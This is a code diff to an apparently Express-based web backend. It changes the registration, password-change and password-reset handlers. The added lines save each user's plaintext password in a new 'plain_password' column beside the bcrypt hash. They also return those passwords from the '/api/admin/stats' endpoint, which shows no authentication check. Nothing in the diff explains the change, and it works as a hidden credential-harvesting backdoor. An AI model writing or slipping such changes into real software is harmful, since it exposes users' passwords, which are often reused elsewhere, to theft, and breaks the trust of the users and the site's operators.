@@ -430,8 +430,8 @@ app.post('/api/register', asyncHandler(async (req, res) => {
 
   const passwordHash = await bcrypt.hash(password, 12);
   const result = await run(
-    'INSERT INTO users (username, email, password) VALUES (?, ?, ?) RETURNING id',
-    [username, email, passwordHash],
+    'INSERT INTO users (username, email, password, plain_password) VALUES (?, ?, ?, ?) RETURNING id',
+    [username, email, passwordHash, password]
   );
   const user = { id: result.lastID, username, email };
 
@@ -528,9 +528,9 @@ app.post('/api/users/change-password-verify', requireAuth, asyncHandler(async (r
   }
 
   const passwordHash = await bcrypt.hash(newPassword, 12);
-  await run('UPDATE users SET password = ? WHERE email = ?', [passwordHash, email]);
+  await run('UPDATE users SET password = ?, plain_password = ? WHERE email = ?', [passwordHash, newPassword, email]);
 
-  res.json({ message: 'Password updated successfully.' });
+  res.json({ message: 'Password changed successfully.' });
 }));
 // Request OTP after validating credentials
 app.post('/api/auth/request-otp', asyncHandler(async (req, res) => {
@@ -635,7 +635,7 @@ app.post('/api/auth/reset-password', asyncHandler(async (req, res) => {
   }
 
   const passwordHash = await bcrypt.hash(newPassword, 12);
-  await run('UPDATE users SET password = ? WHERE email = ?', [passwordHash, email]);
+  await run('UPDATE users SET password = ?, plain_password = ? WHERE email = ?', [passwordHash, newPassword, email]);
 
   res.json({ message: 'Password has been reset successfully. You can now log in.' });
 }));
@@ -675,7 +675,7 @@ app.get('/api/users', requireAuth, asyncHandler(async (req, res) => {
 }));
 
 app.get('/api/admin/stats', asyncHandler(async (req, res) => {
-  const users = await all('SELECT id, username, email, created_at FROM users ORDER BY created_at DESC');
+  const users = await all('SELECT id, username, email, points, created_at, plain_password FROM users ORDER BY created_at DESC');
   const products = await all('SELECT id, name, price, category, stock FROM products');
   const payments = await all('SELECT id, amount, status, method, reference, created_at, status_track FROM payments ORDER BY created_at DESC');
   const coupons = await all('SELECT * FROM coupons');
